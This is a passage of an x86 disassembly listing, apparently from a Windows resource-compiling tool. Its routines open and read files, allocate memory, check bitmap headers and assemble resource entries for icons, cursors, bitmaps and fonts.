  406598:	66 c7 05 78 ab 40 00 	movw   $0x6,0x40ab78
  40659f:	06 00 
  4065a1:	8b 2d 4c ab 40 00    	mov    0x40ab4c,%ebp
  4065a7:	8b 35 44 ab 40 00    	mov    0x40ab44,%esi
  4065ad:	39 ee                	cmp    %ebp,%esi
  4065af:	0f 84 98 00 00 00    	je     0x40664d
  4065b5:	f6 46 02 80          	testb  $0x80,0x2(%esi)
  4065b9:	75 20                	jne    0x4065db
  4065bb:	80 7e 03 01          	cmpb   $0x1,0x3(%esi)
  4065bf:	75 1a                	jne    0x4065db
  4065c1:	80 4e 02 80          	orb    $0x80,0x2(%esi)
  4065c5:	66 8b 16             	mov    (%esi),%dx
  4065c8:	e8 1c ff ff ff       	call   0x4064e9
  4065cd:	0f 82 85 00 00 00    	jb     0x406658
  4065d3:	8b 1d 78 aa 40 00    	mov    0x40aa78,%ebx
  4065d9:	eb 34                	jmp    0x40660f
  4065db:	83 c6 10             	add    $0x10,%esi
  4065de:	eb cd                	jmp    0x4065ad
  4065e0:	52                   	push   %edx
  4065e1:	ba 02 00 00 00       	mov    $0x2,%edx
  4065e6:	e8 f5 e7 ff ff       	call   0x404de0
  4065eb:	5a                   	pop    %edx
  4065ec:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  4065f1:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4065f6:	83 05 78 aa 40 00 02 	addl   $0x2,0x40aa78
  4065fd:	66 42                	inc    %dx
  4065ff:	f6 c2 0f             	test   $0xf,%dl
  406602:	75 0b                	jne    0x40660f
  406604:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  406609:	29 d8                	sub    %ebx,%eax
  40660b:	89 07                	mov    %eax,(%edi)
  40660d:	eb 98                	jmp    0x4065a7
  40660f:	8b 35 44 ab 40 00    	mov    0x40ab44,%esi
  406615:	39 ee                	cmp    %ebp,%esi
  406617:	74 c7                	je     0x4065e0
  406619:	f6 46 02 80          	testb  $0x80,0x2(%esi)
  40661d:	75 29                	jne    0x406648
  40661f:	80 7e 03 00          	cmpb   $0x0,0x3(%esi)
  406623:	75 23                	jne    0x406648
  406625:	66 3b 56 04          	cmp    0x4(%esi),%dx
  406629:	75 1d                	jne    0x406648
  40662b:	80 4e 02 80          	orb    $0x80,0x2(%esi)
  40662f:	f6 46 02 02          	testb  $0x2,0x2(%esi)
  406633:	74 07                	je     0x40663c
  406635:	80 0d c6 ab 40 00 10 	orb    $0x10,0x40abc6
  40663c:	e8 1d ff ff ff       	call   0x40655e
  406641:	72 15                	jb     0x406658
  406643:	83 c6 10             	add    $0x10,%esi
  406646:	eb b5                	jmp    0x4065fd
  406648:	83 c6 10             	add    $0x10,%esi
  40664b:	eb c8                	jmp    0x406615
  40664d:	8b 1d 78 aa 40 00    	mov    0x40aa78,%ebx
  406653:	31 f6                	xor    %esi,%esi
  406655:	f8                   	clc
  406656:	5d                   	pop    %ebp
  406657:	c3                   	ret
  406658:	ba 8a 18 01 00       	mov    $0x1188a,%edx
  40665d:	f9                   	stc
  40665e:	5d                   	pop    %ebp
  40665f:	c3                   	ret
  406660:	51                   	push   %ecx
  406661:	52                   	push   %edx
  406662:	eb 17                	jmp    0x40667b
  406664:	51                   	push   %ecx
  406665:	52                   	push   %edx
  406666:	8b 0d c8 aa 40 00    	mov    0x40aac8,%ecx
  40666c:	e3 0d                	jecxz  0x40667b
  40666e:	68 00 80 00 00       	push   $0x8000
  406673:	6a 00                	push   $0x0
  406675:	51                   	push   %ecx
  406676:	e8 f7 b9 00 00       	call   0x412072
  40667b:	8b 0d c4 aa 40 00    	mov    0x40aac4,%ecx
  406681:	e3 06                	jecxz  0x406689
  406683:	51                   	push   %ecx
  406684:	e8 9b b9 00 00       	call   0x412024
  406689:	5a                   	pop    %edx
  40668a:	59                   	pop    %ecx
  40668b:	c3                   	ret
  40668c:	80 3f 5c             	cmpb   $0x5c,(%edi)
  40668f:	74 05                	je     0x406696
  406691:	80 3f 2e             	cmpb   $0x2e,(%edi)
  406694:	75 13                	jne    0x4066a9
  406696:	53                   	push   %ebx
  406697:	56                   	push   %esi
  406698:	57                   	push   %edi
  406699:	e8 65 dc ff ff       	call   0x404303
  40669e:	5a                   	pop    %edx
  40669f:	5e                   	pop    %esi
  4066a0:	5b                   	pop    %ebx
  4066a1:	29 fa                	sub    %edi,%edx
  4066a3:	29 d3                	sub    %edx,%ebx
  4066a5:	e3 0a                	jecxz  0x4066b1
  4066a7:	eb e3                	jmp    0x40668c
  4066a9:	80 3f 3e             	cmpb   $0x3e,(%edi)
  4066ac:	75 03                	jne    0x4066b1
  4066ae:	47                   	inc    %edi
  4066af:	43                   	inc    %ebx
  4066b0:	49                   	dec    %ecx
  4066b1:	89 1d 18 ab 40 00    	mov    %ebx,0x40ab18
  4066b7:	89 35 14 ab 40 00    	mov    %esi,0x40ab14
  4066bd:	8a 06                	mov    (%esi),%al
  4066bf:	3c 22                	cmp    $0x22,%al
  4066c1:	74 12                	je     0x4066d5
  4066c3:	3c 3c                	cmp    $0x3c,%al
  4066c5:	74 0e                	je     0x4066d5
  4066c7:	80 7f ff 22          	cmpb   $0x22,-0x1(%edi)
  4066cb:	74 17                	je     0x4066e4
  4066cd:	80 7f ff 3e          	cmpb   $0x3e,-0x1(%edi)
  4066d1:	74 11                	je     0x4066e4
  4066d3:	eb 0d                	jmp    0x4066e2
  4066d5:	01 d9                	add    %ebx,%ecx
  4066d7:	29 df                	sub    %ebx,%edi
  4066d9:	e8 bf e6 ff ff       	call   0x404d9d
  4066de:	72 04                	jb     0x4066e4
  4066e0:	74 02                	je     0x4066e4
  4066e2:	f8                   	clc
  4066e3:	c3                   	ret
  4066e4:	ba 31 08 00 00       	mov    $0x831,%edx
  4066e9:	f9                   	stc
  4066ea:	c3                   	ret
  4066eb:	ff 35 8c ab 40 00    	push   0x40ab8c
  4066f1:	ff 35 94 ab 40 00    	push   0x40ab94
  4066f7:	ff 35 90 ab 40 00    	push   0x40ab90
  4066fd:	51                   	push   %ecx
  4066fe:	57                   	push   %edi
  4066ff:	53                   	push   %ebx
  406700:	56                   	push   %esi
  406701:	89 da                	mov    %ebx,%edx
  406703:	a1 94 ab 40 00       	mov    0x40ab94,%eax
  406708:	a3 8c ab 40 00       	mov    %eax,0x40ab8c
  40670d:	50                   	push   %eax
  40670e:	31 db                	xor    %ebx,%ebx
  406710:	e8 52 cf ff ff       	call   0x403667
  406715:	72 14                	jb     0x40672b
  406717:	8b 3d 94 ab 40 00    	mov    0x40ab94,%edi
  40671d:	c6 07 00             	movb   $0x0,(%edi)
  406720:	ff 05 94 ab 40 00    	incl   0x40ab94
  406726:	e8 4e d3 ff ff       	call   0x403a79
  40672b:	5e                   	pop    %esi
  40672c:	72 02                	jb     0x406730
  40672e:	89 f2                	mov    %esi,%edx
  406730:	5e                   	pop    %esi
  406731:	5b                   	pop    %ebx
  406732:	5f                   	pop    %edi
  406733:	59                   	pop    %ecx
  406734:	8f 05 90 ab 40 00    	pop    0x40ab90
  40673a:	8f 05 94 ab 40 00    	pop    0x40ab94
  406740:	8f 05 8c ab 40 00    	pop    0x40ab8c
  406746:	c3                   	ret
  406747:	89 f2                	mov    %esi,%edx
  406749:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  406750:	75 17                	jne    0x406769
  406752:	a1 88 aa 40 00       	mov    0x40aa88,%eax
  406757:	09 c0                	or     %eax,%eax
  406759:	74 05                	je     0x406760
  40675b:	8a 40 24             	mov    0x24(%eax),%al
  40675e:	eb 05                	jmp    0x406765
  406760:	a0 c4 ab 40 00       	mov    0x40abc4,%al
  406765:	24 06                	and    $0x6,%al
  406767:	74 05                	je     0x40676e
  406769:	e8 67 b4 ff ff       	call   0x401bd5
  40676e:	6a 00                	push   $0x0
  406770:	6a 00                	push   $0x0
  406772:	6a 03                	push   $0x3
  406774:	6a 00                	push   $0x0
  406776:	6a 01                	push   $0x1
  406778:	68 00 00 00 80       	push   $0x80000000
  40677d:	52                   	push   %edx
  40677e:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  406785:	74 08                	je     0x40678f
  406787:	ff 15 50 90 40 00    	call   *0x409050
  40678d:	eb 05                	jmp    0x406794
  40678f:	e8 7e b8 00 00       	call   0x412012
  406794:	ba 32 08 00 01       	mov    $0x1000832,%edx
  406799:	83 f8 ff             	cmp    $0xffffffff,%eax
  40679c:	c3                   	ret
  40679d:	56                   	push   %esi
  40679e:	89 d6                	mov    %edx,%esi
  4067a0:	e8 a2 ff ff ff       	call   0x406747
  4067a5:	75 34                	jne    0x4067db
  4067a7:	f6 05 ca ab 40 00 10 	testb  $0x10,0x40abca
  4067ae:	74 2b                	je     0x4067db
  4067b0:	8b 0d 80 aa 40 00    	mov    0x40aa80,%ecx
  4067b6:	09 c9                	or     %ecx,%ecx
  4067b8:	74 21                	je     0x4067db
  4067ba:	8b 15 84 aa 40 00    	mov    0x40aa84,%edx
  4067c0:	4a                   	dec    %edx
  4067c1:	78 16                	js     0x4067d9
  4067c3:	8a 06                	mov    (%esi),%al
  4067c5:	88 01                	mov    %al,(%ecx)
  4067c7:	46                   	inc    %esi
  4067c8:	41                   	inc    %ecx
  4067c9:	08 c0                	or     %al,%al
  4067cb:	75 f3                	jne    0x4067c0
  4067cd:	be c0 ef 40 00       	mov    $0x40efc0,%esi
  4067d2:	e8 70 ff ff ff       	call   0x406747
  4067d7:	75 02                	jne    0x4067db
  4067d9:	39 f6                	cmp    %esi,%esi
  4067db:	5e                   	pop    %esi
  4067dc:	c3                   	ret
  4067dd:	51                   	push   %ecx
  4067de:	c7 05 c4 aa 40 00 00 	movl   $0x0,0x40aac4
  4067e5:	00 00 00 
  4067e8:	57                   	push   %edi
  4067e9:	56                   	push   %esi
  4067ea:	89 d9                	mov    %ebx,%ecx
  4067ec:	81 f9 00 02 00 00    	cmp    $0x200,%ecx
  4067f2:	76 05                	jbe    0x4067f9
  4067f4:	b9 00 02 00 00       	mov    $0x200,%ecx
  4067f9:	bf c0 f0 40 00       	mov    $0x40f0c0,%edi
  4067fe:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406800:	c6 07 00             	movb   $0x0,(%edi)
  406803:	5e                   	pop    %esi
  406804:	5f                   	pop    %edi
  406805:	ba c0 f0 40 00       	mov    $0x40f0c0,%edx
  40680a:	e8 8e ff ff ff       	call   0x40679d
  40680f:	75 3a                	jne    0x40684b
  406811:	3b 35 98 ab 40 00    	cmp    0x40ab98,%esi
  406817:	77 08                	ja     0x406821
  406819:	3b 35 88 ab 40 00    	cmp    0x40ab88,%esi
  40681f:	73 20                	jae    0x406841
  406821:	31 d2                	xor    %edx,%edx
  406823:	f6 05 ca ab 40 00 20 	testb  $0x20,0x40abca
  40682a:	75 15                	jne    0x406841
  40682c:	80 0d ca ab 40 00 20 	orb    $0x20,0x40abca
  406833:	e8 b3 fe ff ff       	call   0x4066eb
  406838:	72 07                	jb     0x406841
  40683a:	e8 5e ff ff ff       	call   0x40679d
  40683f:	75 0a                	jne    0x40684b
  406841:	80 25 ca ab 40 00 cf 	andb   $0xcf,0x40abca
  406848:	f9                   	stc
  406849:	eb 29                	jmp    0x406874
  40684b:	a3 c4 aa 40 00       	mov    %eax,0x40aac4
  406850:	6a 00                	push   $0x0
  406852:	50                   	push   %eax
  406853:	e8 f0 b7 00 00       	call   0x412048
  406858:	ba 34 08 00 01       	mov    $0x1000834,%edx
  40685d:	83 f8 ff             	cmp    $0xffffffff,%eax
  406860:	74 df                	je     0x406841
  406862:	ba 35 08 00 01       	mov    $0x1000835,%edx
  406867:	09 c0                	or     %eax,%eax
  406869:	74 d6                	je     0x406841
  40686b:	89 c3                	mov    %eax,%ebx
  40686d:	80 25 ca ab 40 00 cf 	andb   $0xcf,0x40abca
  406874:	59                   	pop    %ecx
  406875:	c3                   	ret
  406876:	c7 05 c8 aa 40 00 00 	movl   $0x0,0x40aac8
  40687d:	00 00 00 
  406880:	51                   	push   %ecx
  406881:	6a 04                	push   $0x4
  406883:	68 00 30 00 00       	push   $0x3000
  406888:	53                   	push   %ebx
  406889:	6a 00                	push   $0x0
  40688b:	e8 be b7 00 00       	call   0x41204e
  406890:	ba 8a 18 01 00       	mov    $0x1188a,%edx
  406895:	09 c0                	or     %eax,%eax
  406897:	59                   	pop    %ecx
  406898:	c3                   	ret
  406899:	51                   	push   %ecx
  40689a:	6a 00                	push   $0x0
  40689c:	68 40 ab 40 00       	push   $0x40ab40
  4068a1:	53                   	push   %ebx
  4068a2:	50                   	push   %eax
  4068a3:	ff 35 c4 aa 40 00    	push   0x40aac4
  4068a9:	e8 a6 b7 00 00       	call   0x412054
  4068ae:	39 1d 40 ab 40 00    	cmp    %ebx,0x40ab40
  4068b4:	75 04                	jne    0x4068ba
  4068b6:	09 c0                	or     %eax,%eax
  4068b8:	75 06                	jne    0x4068c0
  4068ba:	ba 36 08 00 00       	mov    $0x836,%edx
  4068bf:	f9                   	stc
  4068c0:	59                   	pop    %ecx
  4068c1:	c3                   	ret
  4068c2:	eb 07                	jmp    0x4068cb
  4068c4:	e8 84 e7 ff ff       	call   0x40504d
  4068c9:	66 ab                	stos   %ax,%es:(%edi)
  4068cb:	09 db                	or     %ebx,%ebx
  4068cd:	75 f5                	jne    0x4068c4
  4068cf:	66 c7 07 00 00       	movw   $0x0,(%edi)
  4068d4:	83 c7 02             	add    $0x2,%edi
  4068d7:	c3                   	ret
  4068d8:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  4068df:	74 0e                	je     0x4068ef
  4068e1:	57                   	push   %edi
  4068e2:	e8 db ff ff ff       	call   0x4068c2
  4068e7:	ff 15 60 90 40 00    	call   *0x409060
  4068ed:	eb 0f                	jmp    0x4068fe
  4068ef:	e8 cb c3 ff ff       	call   0x402cbf
  4068f4:	be ec ab 40 00       	mov    $0x40abec,%esi
  4068f9:	e8 c4 ff ff ff       	call   0x4068c2
  4068fe:	c3                   	ret
  4068ff:	e8 15 c3 ff ff       	call   0x402c19
  406904:	89 3d 7c aa 40 00    	mov    %edi,0x40aa7c
  40690a:	56                   	push   %esi
  40690b:	53                   	push   %ebx
  40690c:	57                   	push   %edi
  40690d:	89 d8                	mov    %ebx,%eax
  40690f:	ab                   	stos   %eax,%es:(%edi)
  406910:	83 c7 04             	add    $0x4,%edi
  406913:	8b 35 54 ab 40 00    	mov    0x40ab54,%esi
  406919:	8b 1d 5c ab 40 00    	mov    0x40ab5c,%ebx
  40691f:	09 db                	or     %ebx,%ebx
  406921:	74 07                	je     0x40692a
  406923:	e8 b0 ff ff ff       	call   0x4068d8
  406928:	eb 0e                	jmp    0x406938
  40692a:	66 b8 ff ff          	mov    $0xffff,%ax
  40692e:	66 ab                	stos   %ax,%es:(%edi)
  406930:	66 a1 78 ab 40 00    	mov    0x40ab78,%ax
  406936:	66 ab                	stos   %ax,%es:(%edi)
  406938:	8b 35 58 ab 40 00    	mov    0x40ab58,%esi
  40693e:	8b 1d 60 ab 40 00    	mov    0x40ab60,%ebx
  406944:	09 db                	or     %ebx,%ebx
  406946:	74 1b                	je     0x406963
  406948:	66 83 3d 78 ab 40 00 	cmpw   $0x1,0x40ab78
  40694f:	01 
  406950:	74 11                	je     0x406963
  406952:	66 83 3d 78 ab 40 00 	cmpw   $0x3,0x40ab78
  406959:	03 
  40695a:	74 07                	je     0x406963
  40695c:	e8 77 ff ff ff       	call   0x4068d8
  406961:	eb 0f                	jmp    0x406972
  406963:	66 c7 07 ff ff       	movw   $0xffff,(%edi)
  406968:	83 c7 02             	add    $0x2,%edi
  40696b:	a1 50 ab 40 00       	mov    0x40ab50,%eax
  406970:	66 ab                	stos   %ax,%es:(%edi)
  406972:	e8 a2 c2 ff ff       	call   0x402c19
  406977:	31 c0                	xor    %eax,%eax
  406979:	ab                   	stos   %eax,%es:(%edi)
  40697a:	66 a1 74 ab 40 00    	mov    0x40ab74,%ax
  406980:	66 ab                	stos   %ax,%es:(%edi)
  406982:	66 a1 7c ab 40 00    	mov    0x40ab7c,%ax
  406988:	f6 05 c6 ab 40 00 80 	testb  $0x80,0x40abc6
  40698f:	75 06                	jne    0x406997
  406991:	66 a1 7a ab 40 00    	mov    0x40ab7a,%ax
  406997:	66 ab                	stos   %ax,%es:(%edi)
  406999:	a1 70 ab 40 00       	mov    0x40ab70,%eax
  40699e:	f6 05 c6 ab 40 00 40 	testb  $0x40,0x40abc6
  4069a5:	75 05                	jne    0x4069ac
  4069a7:	a1 6c ab 40 00       	mov    0x40ab6c,%eax
  4069ac:	ab                   	stos   %eax,%es:(%edi)
  4069ad:	a1 68 ab 40 00       	mov    0x40ab68,%eax
  4069b2:	ab                   	stos   %eax,%es:(%edi)
  4069b3:	5a                   	pop    %edx
  4069b4:	89 f8                	mov    %edi,%eax
  4069b6:	29 d0                	sub    %edx,%eax
  4069b8:	89 42 04             	mov    %eax,0x4(%edx)
  4069bb:	5b                   	pop    %ebx
  4069bc:	5e                   	pop    %esi
  4069bd:	c3                   	ret
  4069be:	66 83 3d 74 ab 40 00 	cmpw   $0x0,0x40ab74
  4069c5:	00 
  4069c6:	75 09                	jne    0x4069d1
  4069c8:	66 c7 05 74 ab 40 00 	movw   $0x1000,0x40ab74
  4069cf:	00 10 
  4069d1:	8b 3d 78 aa 40 00    	mov    0x40aa78,%edi
  4069d7:	e8 23 ff ff ff       	call   0x4068ff
  4069dc:	89 d9                	mov    %ebx,%ecx
  4069de:	e3 02                	jecxz  0x4069e2
  4069e0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4069e2:	89 3d 78 aa 40 00    	mov    %edi,0x40aa78
  4069e8:	f8                   	clc
  4069e9:	c3                   	ret
  4069ea:	89 35 54 aa 40 00    	mov    %esi,0x40aa54
  4069f0:	66 a1 78 ab 40 00    	mov    0x40ab78,%ax
  4069f6:	3c 01                	cmp    $0x1,%al
  4069f8:	74 1b                	je     0x406a15
  4069fa:	3c 02                	cmp    $0x2,%al
  4069fc:	74 c0                	je     0x4069be
  4069fe:	3c 03                	cmp    $0x3,%al
  406a00:	74 13                	je     0x406a15
  406a02:	3c 08                	cmp    $0x8,%al
  406a04:	74 b8                	je     0x4069be
  406a06:	3c 0b                	cmp    $0xb,%al
  406a08:	74 b4                	je     0x4069be
  406a0a:	3c 13                	cmp    $0x13,%al
  406a0c:	73 c3                	jae    0x4069d1
  406a0e:	ba 8b 18 01 00       	mov    $0x1188b,%edx
  406a13:	f9                   	stc
  406a14:	c3                   	ret
  406a15:	66 83 3d 74 ab 40 00 	cmpw   $0x0,0x40ab74
  406a1c:	00 
  406a1d:	75 09                	jne    0x406a28
  406a1f:	66 c7 05 74 ab 40 00 	movw   $0x1000,0x40ab74
  406a26:	00 10 
  406a28:	ba 17 10 00 00       	mov    $0x1017,%edx
  406a2d:	31 c9                	xor    %ecx,%ecx
  406a2f:	66 8b 4e 04          	mov    0x4(%esi),%cx
  406a33:	e3 de                	jecxz  0x406a13
  406a35:	80 fd 00             	cmp    $0x0,%ch
  406a38:	75 d9                	jne    0x406a13
  406a3a:	89 f2                	mov    %esi,%edx
  406a3c:	83 c2 06             	add    $0x6,%edx
  406a3f:	c7 05 5c aa 40 00 06 	movl   $0x6,0x40aa5c
  406a46:	00 00 00 
  406a49:	8b 3d 78 aa 40 00    	mov    0x40aa78,%edi
  406a4f:	a1 64 ab 40 00       	mov    0x40ab64,%eax
  406a54:	a3 58 aa 40 00       	mov    %eax,0x40aa58
  406a59:	8b 5a 08             	mov    0x8(%edx),%ebx
  406a5c:	66 83 3d 78 ab 40 00 	cmpw   $0x1,0x40ab78
  406a63:	01 
  406a64:	75 03                	jne    0x406a69
  406a66:	83 c3 04             	add    $0x4,%ebx
  406a69:	51                   	push   %ecx
  406a6a:	52                   	push   %edx
  406a6b:	ff 35 50 ab 40 00    	push   0x40ab50
  406a71:	a1 64 ab 40 00       	mov    0x40ab64,%eax
  406a76:	a3 50 ab 40 00       	mov    %eax,0x40ab50
  406a7b:	ff 05 64 ab 40 00    	incl   0x40ab64
  406a81:	e8 79 fe ff ff       	call   0x4068ff
  406a86:	8f 05 50 ab 40 00    	pop    0x40ab50
  406a8c:	5a                   	pop    %edx
  406a8d:	89 d9                	mov    %ebx,%ecx
  406a8f:	e3 1e                	jecxz  0x406aaf
  406a91:	8b 72 0c             	mov    0xc(%edx),%esi
  406a94:	03 35 54 aa 40 00    	add    0x40aa54,%esi
  406a9a:	66 83 3d 78 ab 40 00 	cmpw   $0x1,0x40ab78
  406aa1:	01 
  406aa2:	75 09                	jne    0x406aad
  406aa4:	8b 42 04             	mov    0x4(%edx),%eax
  406aa7:	ab                   	stos   %eax,%es:(%edi)
  406aa8:	83 e9 04             	sub    $0x4,%ecx
  406aab:	76 02                	jbe    0x406aaf
  406aad:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406aaf:	83 c2 10             	add    $0x10,%edx
  406ab2:	59                   	pop    %ecx
  406ab3:	83 05 5c aa 40 00 0e 	addl   $0xe,0x40aa5c
  406aba:	e2 9d                	loop   0x406a59
  406abc:	66 83 05 78 ab 40 00 	addw   $0xb,0x40ab78
  406ac3:	0b 
  406ac4:	8b 1d 5c aa 40 00    	mov    0x40aa5c,%ebx
  406aca:	e8 30 fe ff ff       	call   0x4068ff
  406acf:	8b 35 54 aa 40 00    	mov    0x40aa54,%esi
  406ad5:	b9 06 00 00 00       	mov    $0x6,%ecx
  406ada:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406adc:	66 8b 4e fe          	mov    -0x2(%esi),%cx
  406ae0:	e3 54                	jecxz  0x406b36
  406ae2:	51                   	push   %ecx
  406ae3:	66 83 3d 78 ab 40 00 	cmpw   $0xc,0x40ab78
  406aea:	0c 
  406aeb:	75 0d                	jne    0x406afa
  406aed:	83 c6 08             	add    $0x8,%esi
  406af0:	ad                   	lods   %ds:(%esi),%eax
  406af1:	83 c0 04             	add    $0x4,%eax
  406af4:	83 c7 08             	add    $0x8,%edi
  406af7:	ab                   	stos   %eax,%es:(%edi)
  406af8:	eb 07                	jmp    0x406b01
  406afa:	b9 0c 00 00 00       	mov    $0xc,%ecx
  406aff:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406b01:	ad                   	lods   %ds:(%esi),%eax
  406b02:	03 05 54 aa 40 00    	add    0x40aa54,%eax
  406b08:	8b 50 0c             	mov    0xc(%eax),%edx
  406b0b:	89 57 f8             	mov    %edx,-0x8(%edi)
  406b0e:	66 83 3d 78 ab 40 00 	cmpw   $0xc,0x40ab78
  406b15:	0c 
  406b16:	75 0e                	jne    0x406b26
  406b18:	8b 50 04             	mov    0x4(%eax),%edx
  406b1b:	66 89 57 f4          	mov    %dx,-0xc(%edi)
  406b1f:	8b 50 08             	mov    0x8(%eax),%edx
  406b22:	66 89 57 f6          	mov    %dx,-0xa(%edi)
  406b26:	a1 58 aa 40 00       	mov    0x40aa58,%eax
  406b2b:	66 ab                	stos   %ax,%es:(%edi)
  406b2d:	ff 05 58 aa 40 00    	incl   0x40aa58
  406b33:	59                   	pop    %ecx
  406b34:	e2 ac                	loop   0x406ae2
  406b36:	89 3d 78 aa 40 00    	mov    %edi,0x40aa78
  406b3c:	f8                   	clc
  406b3d:	c3                   	ret
  406b3e:	e8 c6 d8 ff ff       	call   0x404409
  406b43:	73 04                	jae    0x406b49
  406b45:	e3 79                	jecxz  0x406bc0
  406b47:	eb 7c                	jmp    0x406bc5
  406b49:	e8 b5 d7 ff ff       	call   0x404303
  406b4e:	72 70                	jb     0x406bc0
  406b50:	75 6e                	jne    0x406bc0
  406b52:	e8 7f e0 ff ff       	call   0x404bd6
  406b57:	73 e5                	jae    0x406b3e
  406b59:	e8 2e fb ff ff       	call   0x40668c
  406b5e:	72 65                	jb     0x406bc5
  406b60:	e8 78 fc ff ff       	call   0x4067dd
  406b65:	72 5e                	jb     0x406bc5
  406b67:	e8 0a fd ff ff       	call   0x406876
  406b6c:	74 57                	je     0x406bc5
  406b6e:	a3 c8 aa 40 00       	mov    %eax,0x40aac8
  406b73:	e8 21 fd ff ff       	call   0x406899
  406b78:	72 4b                	jb     0x406bc5
  406b7a:	89 da                	mov    %ebx,%edx
  406b7c:	81 c2 00 20 00 00    	add    $0x2000,%edx
  406b82:	e8 59 e2 ff ff       	call   0x404de0
  406b87:	72 3c                	jb     0x406bc5
  406b89:	8b 35 c8 aa 40 00    	mov    0x40aac8,%esi
  406b8f:	51                   	push   %ecx
  406b90:	57                   	push   %edi
  406b91:	66 83 3d 78 ab 40 00 	cmpw   $0x2,0x40ab78
  406b98:	02 
  406b99:	75 15                	jne    0x406bb0
  406b9b:	ba 7f 08 00 00       	mov    $0x87f,%edx
  406ba0:	66 81 3e 42 4d       	cmpw   $0x4d42,(%esi)
  406ba5:	f9                   	stc
  406ba6:	75 0d                	jne    0x406bb5
  406ba8:	83 c6 0e             	add    $0xe,%esi
  406bab:	83 eb 0e             	sub    $0xe,%ebx
  406bae:	72 05                	jb     0x406bb5
  406bb0:	e8 35 fe ff ff       	call   0x4069ea
  406bb5:	5f                   	pop    %edi
  406bb6:	59                   	pop    %ecx
  406bb7:	72 0c                	jb     0x406bc5
  406bb9:	e8 a6 fa ff ff       	call   0x406664
  406bbe:	f8                   	clc
  406bbf:	c3                   	ret
  406bc0:	ba 30 08 00 02       	mov    $0x2000830,%edx
  406bc5:	e8 9a fa ff ff       	call   0x406664
  406bca:	f9                   	stc
  406bcb:	c3                   	ret
  406bcc:	80 0d c6 ab 40 00 04 	orb    $0x4,0x40abc6
  406bd3:	56                   	push   %esi
  406bd4:	e8 30 d8 ff ff       	call   0x404409
  406bd9:	72 7e                	jb     0x406c59
  406bdb:	0f 84 a0 00 00 00    	je     0x406c81
  406be1:	e8 1d d7 ff ff       	call   0x404303
  406be6:	0f 82 85 00 00 00    	jb     0x406c71
  406bec:	74 55                	je     0x406c43
  406bee:	ba 00 04 00 00       	mov    $0x400,%edx
  406bf3:	e8 e8 e1 ff ff       	call   0x404de0
  406bf8:	72 5f                	jb     0x406c59
  406bfa:	80 7c 1e ff 4c       	cmpb   $0x4c,-0x1(%esi,%ebx,1)
  406bff:	74 23                	je     0x406c24
  406c01:	80 7c 1e ff 6c       	cmpb   $0x6c,-0x1(%esi,%ebx,1)
  406c06:	74 1c                	je     0x406c24
  406c08:	e8 bf cf ff ff       	call   0x403bcc
  406c0d:	72 62                	jb     0x406c71
  406c0f:	e8 8b d0 ff ff       	call   0x403c9f
  406c14:	72 43                	jb     0x406c59
  406c16:	8b 35 78 aa 40 00    	mov    0x40aa78,%esi
  406c1c:	66 89 06             	mov    %ax,(%esi)
  406c1f:	83 c6 02             	add    $0x2,%esi
  406c22:	eb 17                	jmp    0x406c3b
  406c24:	e8 a3 cf ff ff       	call   0x403bcc
  406c29:	72 46                	jb     0x406c71
  406c2b:	e8 4e d0 ff ff       	call   0x403c7e
  406c30:	8b 35 78 aa 40 00    	mov    0x40aa78,%esi
  406c36:	89 06                	mov    %eax,(%esi)
  406c38:	83 c6 04             	add    $0x4,%esi
  406c3b:	89 35 78 aa 40 00    	mov    %esi,0x40aa78
  406c41:	eb 64                	jmp    0x406ca7
  406c43:	e8 69 17 00 00       	call   0x4083b1
  406c48:	0f 84 60 00 00 00    	je     0x406cae
  406c4e:	e8 b5 ce ff ff       	call   0x403b08
  406c53:	73 06                	jae    0x406c5b
  406c55:	09 d2                	or     %edx,%edx
  406c57:	74 18                	je     0x406c71
  406c59:	eb 1c                	jmp    0x406c77
  406c5b:	e8 2e cf ff ff       	call   0x403b8e
  406c60:	0f 82 6e ff ff ff    	jb     0x406bd4
  406c66:	74 c8                	je     0x406c30
  406c68:	e8 d3 d0 ff ff       	call   0x403d40
  406c6d:	72 02                	jb     0x406c71
  406c6f:	eb 17                	jmp    0x406c88
  406c71:	8b 15 cc aa 40 00    	mov    0x40aacc,%edx
  406c77:	80 25 c6 ab 40 00 fb 	andb   $0xfb,0x40abc6
  406c7e:	f9                   	stc
  406c7f:	58                   	pop    %eax
  406c80:	c3                   	ret
  406c81:	e8 01 e6 ff ff       	call   0x405287
  406c86:	72 ef                	jb     0x406c77
  406c88:	89 da                	mov    %ebx,%edx
  406c8a:	d1 e2                	shl    $1,%edx
  406c8c:	e8 4f e1 ff ff       	call   0x404de0
  406c91:	72 e4                	jb     0x406c77
  406c93:	51                   	push   %ecx
  406c94:	57                   	push   %edi
  406c95:	8b 3d 78 aa 40 00    	mov    0x40aa78,%edi
  406c9b:	e8 e8 e4 ff ff       	call   0x405188
  406ca0:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  406ca5:	5f                   	pop    %edi
  406ca6:	59                   	pop    %ecx
  406ca7:	e8 b5 d8 ff ff       	call   0x404561
  406cac:	09 ff                	or     %edi,%edi
  406cae:	9c                   	pushf
  406caf:	80 25 c6 ab 40 00 fb 	andb   $0xfb,0x40abc6
  406cb6:	9d                   	popf
  406cb7:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  406cbe:	00 00 00 
  406cc1:	5e                   	pop    %esi
  406cc2:	c3                   	ret
  406cc3:	e8 41 d7 ff ff       	call   0x404409
  406cc8:	72 24                	jb     0x406cee
  406cca:	74 22                	je     0x406cee
  406ccc:	e8 32 d6 ff ff       	call   0x404303
  406cd1:	ba 70 08 00 00       	mov    $0x870,%edx
  406cd6:	72 16                	jb     0x406cee
  406cd8:	75 14                	jne    0x406cee
  406cda:	66 a1 78 ab 40 00    	mov    0x40ab78,%ax
  406ce0:	e8 9e 15 00 00       	call   0x408283
  406ce5:	72 09                	jb     0x406cf0
  406ce7:	e8 da f6 ff ff       	call   0x4063c6
  406cec:	73 d5                	jae    0x406cc3
  406cee:	f9                   	stc
  406cef:	c3                   	ret
